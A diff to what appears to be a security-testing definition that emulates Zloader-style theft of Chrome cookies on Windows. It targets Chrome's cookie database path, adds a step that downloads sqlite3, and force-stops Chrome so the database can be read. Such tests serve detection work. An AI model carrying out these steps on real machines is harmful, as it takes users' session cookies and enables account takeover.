@@ -2,15 +2,15 @@ api_version: "2.0"
 name: Steal Chrome Cookies (Windows)
 description: "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n"
 args:
-    - name: cookie_db
-      type: string
-      default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies
     - name: sqlite3_path
       type: path
       default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
     - name: output_file
       type: path
       default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
+    - name: cookie_db
+      type: string
+      default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies
 uuid: 26a6b840-4943-4965-8df5-ef1f9a282440
 mitre:
     tactics:
@@ -21,6 +21,14 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Sqlite3 must exist at (#{sqlite3_path})
+      inline: |
+        if (Test-Path "#{sqlite3_path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+        Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
+        }}
+      executor: powershell
     - name: steal-chrome-cookies-(windows)
       inline: |
         stop-process -name "chrome" -force -erroraction silentlycontinue
